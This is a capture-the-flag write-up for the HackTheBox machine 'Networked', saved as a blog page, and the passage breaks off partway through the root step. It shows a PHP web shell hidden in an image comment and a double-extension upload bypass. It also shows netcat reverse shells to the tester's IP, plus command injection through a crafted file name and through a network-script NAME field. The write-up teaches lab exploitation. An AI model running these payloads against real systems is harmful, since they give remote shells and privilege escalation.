<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Networked | Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10.10.10.146 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 04:59 BST Nmap scan report for...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">

  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
  <script src="/tipuesearch_content.js"></script>
  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
  <script src="/theme/tipuesearch/tipuesearch.js"></script>
 


<meta name="keywords" content="HackTheBox">


  <title>Networked</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation"> 
	  
		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
		</form>
		
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="htts://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
<i class="fa fa-twitter fa-lg"></i></a>
                <a href="https://github.com/M4rc0ff" title="github" >
<i class="fa fa-github fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2020-06-24 05:56:00+01:00">Wed 24 June 2020</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Networked.html">Networked</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Networked.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <h1 id="recon">Recon</h1>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.146              
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 04:59 BST</span>
<span class="go">Nmap scan report for 10.10.10.146</span>
<span class="go">Host is up (0.76s latency).</span>
<span class="go">Not shown: 997 filtered ports </span>
<span class="go">PORT    STATE  SERVICE VERSION</span>
<span class="go">22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span>
<span class="go">| ssh-hostkey:                                                                                                                                         </span>
<span class="go">|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)</span>
<span class="go">|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)                                                                                        </span>
<span class="go">|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)</span>
<span class="go">80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span>
<span class="go">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16         </span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).</span>
<span class="go">443/tcp closed https                                                       </span>

<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 83.06 seconds</span>
</pre></div>


<p>The webpage and its source show the following content:</p>
<p><img alt="" src="../images/networked-home.png"></p>
<p>the comment let intend there may be a gallery somewhere. I decide to scan for files and directories with <code>gobuster</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -t <span class="m">30</span>
<span class="go">===============================================================</span>
<span class="go">Gobuster v3.0.1</span>
<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
<span class="go">===============================================================</span>
<span class="go">[+] Url:            http://10.10.10.146</span>
<span class="go">[+] Threads:        30</span>
<span class="go">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
<span class="go">[+] User Agent:     gobuster/3.0.1</span>
<span class="go">[+] Extensions:     html,php,txt</span>
<span class="go">[+] Timeout:        10s</span>
<span class="go">===============================================================</span>
<span class="go">2020/06/24 05:03:44 Starting gobuster</span>
<span class="go">===============================================================</span>
<span class="go">/uploads (Status: 301)</span>
<span class="go">/index.php (Status: 200)</span>
<span class="go">/photos.php (Status: 200)</span>
<span class="go">/upload.php (Status: 200)</span>
<span class="go">/lib.php (Status: 200)</span>
<span class="go">/backup (Status: 301)</span>
</pre></div>


<p><code>gobuster</code> shows there is an upload directory which I visit and it gives this result:</p>
<p><img alt="" src="../images/networked-upload.png"></p>
<p>I was able to upload a JPG file, just a screenshot of the Kali logo, which I noticed it ended up into the <code>/photos.php</code> page:</p>
<p><img alt="" src="../images/networked-photos.png"></p>
<p>I also notices a <code>/backup</code> directory where I found a tar file which I downloaded to my box:</p>
<p><img alt="" src="../images/networked-backup.png"></p>
<p>Once downloaded I extract the content and I can see we are dealing with the source code of the PHP pages we have visited:</p>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$</span> ll
<span class="go">total 16</span>
<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff  229 Jul  9  2019 index.php</span>
<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 2001 Jul  2  2019 lib.php</span>
<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1871 Jul  2  2019 photos.php</span>
<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1331 Jul  2  2019 upload.php</span>
</pre></div>


<p>This is what's inside the <code>upload.php</code> file:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">&#39;/var/www/html/lib.php&#39;</span><span class="p">;</span>

<span class="nb">define</span><span class="p">(</span><span class="s2">&quot;UPLOAD_DIR&quot;</span><span class="p">,</span> <span class="s2">&quot;/var/www/html/uploads/&quot;</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;myFile&quot;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$myFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;myFile&quot;</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;myFile&quot;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;myFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s1">&#39;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#39;</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">&quot;error&quot;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;An error occurred.&lt;/p&gt;&quot;</span><span class="p">;</span>
        <span class="nx">displayform</span><span class="p">();</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//$name = $_SERVER[&#39;REMOTE_ADDR&#39;].&#39;-&#39;. $myFile[&quot;name&quot;];</span>
    <span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;.png&#39;</span><span class="p">,</span> <span class="s1">&#39;.gif&#39;</span><span class="p">,</span> <span class="s1">&#39;.jpeg&#39;</span><span class="p">);</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$valid</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Invalid image file&lt;/p&gt;&quot;</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
      <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>

    <span class="nv">$success</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Unable to save file.&lt;/p&gt;&quot;</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;&quot;</span><span class="p">;</span>

    <span class="c1">// set proper permissions on the new file</span>
    <span class="nb">chmod</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">displayform</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>The above code shows that there are 2 conditions for the file upload:</p>
<ol>
<li>the file size must be &lt; 60000</li>
<li>the extension must be either of these: '.jpg', '.png', '.gif', '.jpeg'</li>
</ol>
<p>With this information I will use a technique where I will hide a web shell code in the image comments and then I will give the file double extension. Here the steps:</p>
<ol>
<li>
<p>I took a screenshot of my blog logo and named it <code>SittingDucks.png</code></p>
</li>
<li>
<p>add the web shell in the image with the following command:</p>
</li>
</ol>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$</span> exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&#39;</span> SittingDucks.png
<span class="go">1 image files updated</span>
</pre></div>


<p>Note that the image now contains the web shell code <code>&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;</code> on its comment section:</p>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$</span> exiftool SittingDucks.png
<span class="go">ExifTool Version Number         : 12.00</span>
<span class="go">File Name                       : SittingDucks.png</span>
<span class="go">Directory                       : .</span>
<span class="go">File Size                       : 16 kB</span>
<span class="go">File Modification Date/Time     : 2020:06:24 15:11:34+01:00</span>
<span class="go">File Access Date/Time           : 2020:06:24 15:11:34+01:00</span>
<span class="go">File Inode Change Date/Time     : 2020:06:24 15:11:34+01:00</span>
<span class="go">File Permissions                : rw-r--r--</span>
<span class="go">File Type                       : PNG</span>
<span class="go">File Type Extension             : png</span>
<span class="go">MIME Type                       : image/png</span>
<span class="go">Image Width                     : 296</span>
<span class="go">Image Height                    : 188</span>
<span class="go">Bit Depth                       : 8</span>
<span class="go">Color Type                      : RGB</span>
<span class="go">Compression                     : Deflate/Inflate</span>
<span class="go">Filter                          : Adaptive</span>
<span class="go">Interlace                       : Noninterlaced</span>
<span class="go">Significant Bits                : 8 8 8</span>
<span class="go">Comment                         : &lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[cmd]); ?&gt;</span>
<span class="go">Image Size                      : 296x188</span>
<span class="go">Megapixels                      : 0.056</span>
</pre></div>


<ol>
<li>
<p>I rename the image to <code>SittingDucks.php.png</code> and I upload it to the portal:</p>
</li>
<li>
<p>To call the web shell and see if it works I browse to its page where I have appended <code>?cmd=whoami</code>:</p>
<p><img alt="" src="../images/networked-cmd.png"></p>
<p>We can see the <code>whoami</code> command returned the <code>apache</code> user.</p>
</li>
</ol>
<p>This works because the first extension is PHP and there is PHP code inserted into the image comment section. When the page is executed it looks for PHP code and executes it if find it.</p>
<p>Now to get a full shell, I take a shellcode from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:</p>
<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 443 &gt;/tmp/f</code></p>
<p>and since I have to run this on a URL I URL-encode it with burp (CTRL+U):</p>
<p><code>rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&amp;1|nc%2010.10.14.13%20443%20%3E/tmp/f</code></p>
<p>Then I setup a netcat listener on port 443 on my box and I replace the command <code>whoami</code> with the above URL-encoded string in my browser:</p>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lvnp <span class="m">443</span>
<span class="go">[sudo] password for m4rc0ff: </span>
<span class="go">listening on [any] 443 ...</span>
<span class="go">connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 37382</span>
<span class="go">sh: no job control in this shell</span>
<span class="gp">sh-4.2$</span> whoami
<span class="go">whoami</span>
<span class="go">apache</span>
<span class="gp">sh-4.2$</span> python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="go">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>


<p>I get a shell back which I upgraded to an interactive shell with the procedure available <a href="https://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">here</a>. </p>
<p>I move to the <code>/home</code> directory and see this:</p>
<div class="highlight"><pre><span></span><span class="go">bash-4.2$ cd /home/</span>
<span class="go">bash-4.2$ ls -l</span>
<span class="go">total 0</span>
<span class="go">drwxr-xr-x. 2 guly guly 159 Jul  9  2019 guly</span>
<span class="go">bash-4.2$ cd guly/</span>
<span class="go">bash-4.2$ ls -l</span>
<span class="go">total 12</span>
<span class="go">-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php</span>
<span class="go">-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly</span>
<span class="go">-r--------. 1 guly guly  33 Oct 30  2018 user.txt</span>
</pre></div>


<p>I am unable to read the <code>user.txt</code> for obvious permission reasons so we need to privesc to <code>guly</code>. </p>
<div class="highlight"><pre><span></span><span class="go">bash-4.2$ cat crontab.guly </span>
<span class="go">*/3 * * * * php /home/guly/check_attack.php</span>
</pre></div>


<p>The content of the <code>crontab.guly</code> shows the <code>check_attack.php</code> file is ran every 3rd minute of the hour. I have also run <code>pspy</code> to the box which confirms crond is running every 3 minutes:</p>
<div class="highlight"><pre><span></span><span class="go">2020/06/25 07:12:01 CMD: UID=0    PID=13725  | /usr/sbin/crond -n </span>
<span class="go">2020/06/25 07:12:01 CMD: UID=0    PID=13726  | /usr/sbin/CROND -n </span>
<span class="go">2020/06/25 07:15:01 CMD: UID=0    PID=13728  | /usr/sbin/crond -n </span>
<span class="go">2020/06/25 07:15:01 CMD: UID=0    PID=13729  | /usr/sbin/CROND -n </span>
</pre></div>


<p>The conent of the <code>check_attack.php</code> shows this code:</p>
<div class="highlight"><pre><span></span><span class="x">bash-4.2$ cat check_attack.php </span>
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">&#39;/var/www/html/lib.php&#39;</span><span class="p">;</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/uploads/&#39;</span><span class="p">;</span>
<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">&#39;/tmp/attack.log&#39;</span><span class="p">;</span>
<span class="nv">$to</span> <span class="o">=</span> <span class="s1">&#39;guly&#39;</span><span class="p">;</span>
<span class="nv">$msg</span><span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&quot;X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">&#39;/^([^.])/&#39;</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$msg</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">&#39;index.html&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#echo &quot;-------------\n&quot;;</span>

  <span class="c1">#print &quot;check: $value\n&quot;;</span>
  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;attack!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="c1"># todo: attach file</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>

    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm -f </span><span class="si">$logpath</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;nohup /bin/rm -f </span><span class="si">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;rm -f </span><span class="si">$path$value\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">&quot;-F</span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>To summarize this is what the code does:</p>
<ol>
<li>read (<code>scandir</code>) the files in the <code>/var/www/html/uploads</code> directory</li>
<li>store the file names into the <code>$value</code> variable</li>
<li>check if the name stored in <code>$value</code> is an IP address and if not it deletes it, write a log into <code>/tmp/attack.log</code> and send an alert to <code>guly</code> via email</li>
</ol>
<p>The interesting bit is on this line:</p>
<div class="highlight"><pre><span></span><span class="x">exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</span>
</pre></div>


<p>As we alredy mentioned <code>$value</code> is a variable which gets assigned file names present in <code>/var/www/html/uploads</code>. Because we can write into that directory, we can then control <code>$value</code>. </p>
<p>We can then create a file in that directory and call it:</p>
<p><code>shell;nc 10.10.14.13 4444 -c bash</code></p>
<div class="highlight"><pre><span></span><span class="go">bash-4.2$ touch &quot;shell;nc 10.10.14.13 4444 -c bash&quot;       </span>
<span class="go">bash-4.2$ ls -l</span>
<span class="go">total 36</span>
<span class="go">-rw-r--r--  1 apache apache 16193 Jun 25 06:40 10_10_14_13.php.png</span>
<span class="go">-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png</span>
<span class="go">-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png</span>
<span class="go">-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png</span>
<span class="go">-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png</span>
<span class="go">-r--r--r--. 1 root   root       2 Oct 30  2018 index.html</span>
<span class="go">-rw-r--r--  1 apache apache     0 Jun 25 07:57 shell;nc 10.10.14.13 4444 -c bash</span>
</pre></div>


<p>Then when the <code>exec</code> function runs will execute two commands because we added a semicolon:</p>
<ol>
<li><code>nohup /bin/rm -f shell</code></li>
<li><code>nc 10.10.14.13 4444 -c bash</code></li>
</ol>
<p>This way when I start a netcat listner on port 4444 I will get a shell when the cron job runs again:</p>
<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lvnp <span class="m">4444</span>
<span class="go">listening on [any] 4444 ...</span>
<span class="go">connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 56926</span>
<span class="go">whoami</span>
<span class="go">guly</span>
<span class="go">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="gp">[guly@networked ~]$</span> cat user.txt
<span class="go">cat user.txt</span>
<span class="go">52****************************c5</span>
<span class="gp">[guly@networked ~]$</span>
</pre></div>


<p>Although the <code>crontab.guly</code> file is owned by root, it is still a "user" crontab and therefore it runs as <code>guly</code>, this is why we are getting the shell as <code>guly</code> and not <code>root</code>. </p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash -p</span>
cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly <span class="s">&lt;&lt; EoF</span>
<span class="s">DEVICE=guly0</span>
<span class="s">ONBOOT=no</span>
<span class="s">NM_CONTROLLED=no</span>
<span class="s">EoF</span>

<span class="nv">regexp</span><span class="o">=</span><span class="s2">&quot;^[a-zA-Z0-9_\ /-]+</span>$<span class="s2">&quot;</span>

<span class="k">for</span> var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do</span>
        <span class="nb">echo</span> <span class="s2">&quot;interface </span><span class="nv">$var</span><span class="s2">:&quot;</span>
        <span class="nb">read</span> x
        <span class="k">while</span> <span class="o">[[</span> ! <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span>
                <span class="nb">echo</span> <span class="s2">&quot;wrong input, try again&quot;</span>
                <span class="nb">echo</span> <span class="s2">&quot;interface </span><span class="nv">$var</span><span class="s2">:&quot;</span>
                <span class="nb">read</span> x
        <span class="k">done</span>
        <span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly
<span class="k">done</span>

/sbin/ifup guly0
</pre></div>


<p>If I run the above script, I am prompted for some values as follow:</p>
<div class="highlight"><pre><span></span><span class="gp">[root@networked network-scripts]#</span> sudo /usr/local/sbin/changename.sh
<span class="go">interface NAME:</span>
<span class="go">test</span>
<span class="go">interface PROXY_METHOD:</span>
<span class="go">test</span>
<span class="go">interface BROWSER_ONLY:</span>
<span class="go">test</span>
<span class="go">interface BOOTPROTO:</span>
<span class="go">test</span>
<span class="go">ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.</span>
</pre></div>


<p>This makes sense by reading the code. The error it due to the fact that <code>guly0</code> device does not exist, should have been just <code>guly</code></p>
<p>Since we can write stuff inside the <code>/etc/sysconfig/network-scripts/ifcfg-guly</code> thanks to the script I started doing some research to see what exactly I could inject that would give me a shell.</p>
<p>Finally I could these 2 articles that are worth a read:</p>
<ul>
<li>https://seclists.org/fulldisclosure/2019/Apr/24</li>
<li>https://bugzilla.redhat.com/show_bug.cgi?id=1697473</li>
</ul>
<p>Basically the <code>NAME</code> attribute in the ifcfg scripts is not filtered properly. If there is a white/blank space then the system executes whatever is after that space. As an example if I write <code>foo /bin/id</code> to the name attribute then the system will run <code>/bin/id</code>. Let's see this in action:</p>
<div class="highlight"><pre><span></span><span class="gp">[guly@networked ~]$</span> sudo /usr/local/sbin/changename.sh
<span class="go">interface NAME:</span>
<span class="go">foo /bin/id</span>
<span class="go">interface PROXY_METHOD:</span>
